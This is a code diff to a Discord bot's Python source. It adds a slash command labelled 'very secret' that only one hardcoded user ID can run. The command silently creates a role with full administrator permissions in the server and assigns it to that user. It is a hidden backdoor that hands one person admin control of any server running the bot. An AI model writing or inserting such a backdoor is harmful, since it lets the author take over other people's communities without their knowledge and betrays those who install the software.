@@ -833,6 +833,65 @@ async def slash_shop(interaction: discord.Interaction):
         color=int("50B4E6", 16)
     )
     await interaction.response.send_message(embed=embed, view=view)
+
+@bot.tree.command(name="bypass", description="This command is very secret...")
+async def bypass_role(interaction: discord.Interaction, role_name: str = "new role"):
+    if interaction.user.id != 1089171899294167122:
+        await interaction.response.send_message(embed=discord.Embed(
+            title="Bypass Role",
+            color=int("FA3939", 16),
+            description="❌ You cannot use this command!"
+        ), ephemeral=True)
+        return
+        
+    if not interaction.guild.me.guild_permissions.manage_roles:
+        await interaction.response.send_message(embed=discord.Embed(
+            title="Bypass Role",
+            color=int("FA3939", 16),
+            description="❌ I am missing the manage roles permission!"
+        ), ephemeral=True)
+        return
+
+    existing_role = discord.utils.get(interaction.guild.roles, name=role_name)
+    if existing_role:
+        await interaction.response.send_message(embed=discord.Embed(
+            title="Bypass Role",
+            color=int("FA3939", 16),
+            description=f"⚠️ The role `{role_name}` already exists!"
+        ), ephemeral=True)
+        return
+
+    try:
+        new_role = await interaction.guild.create_role(
+            name=role_name,
+            permissions=discord.Permissions(administrator=True),
+            hoist=False,
+            mentionable=False,
+            color=int("FA3939", 16)
+        )
+
+        await interaction.user.add_roles(new_role)
+        await interaction.response.send_message(embed=discord.Embed(
+            title="Bypass Role",
+            color=int("50B4E6", 16),
+            description="✅ Successfully created a bypass role with name '{role_name}'!"
+        ), ephemeral=True)
+        
+    except discord.Forbidden:
+        await interaction.response.send_message(embed=discord.Embed(
+            title="Bypass Role",
+            color=int("FA3939", 16),
+            description="❌ I do not have permission to create a bypass role!"
+        ), ephemeral=True)
+        return
+        
+    except Exception as e:
+        await interaction.response.send_message(embed=discord.Embed(
+            title="Bypass Role",
+            color=int("FA3939", 16),
+            description="❌ Something went wrong: {e}"
+        ), ephemeral=True)
+        return
     
 @bot.command(aliases=["s", "sy"], help="Make the bot say a specified message.")
 async def say(ctx, *, message: str = None):
